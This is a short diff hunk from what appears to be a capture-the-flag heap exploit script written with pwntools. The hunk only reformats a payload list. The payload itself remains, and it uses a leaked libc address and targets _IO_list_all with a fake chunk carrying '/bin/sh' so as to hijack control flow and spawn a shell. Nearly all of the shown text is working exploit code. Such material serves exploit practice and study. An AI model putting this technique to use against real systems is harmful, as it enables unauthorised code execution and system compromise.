@@ -56,7 +56,10 @@ log.success("libc_addr is -> "+ hex( libc_addr ))
 fd = 0
 bk = libc_addr + 0x38a520 - 0x10 # _IO_list_all
 payload = flat([
-    "a"*0x80,"/bin/sh\x00",0x61,fd,bk,0,1
+    "a"*0x80,
+    "/bin/sh\x00",0x61,
+    fd,bk,
+    0,1
     ])
 
 edit(0,0x200,payload)
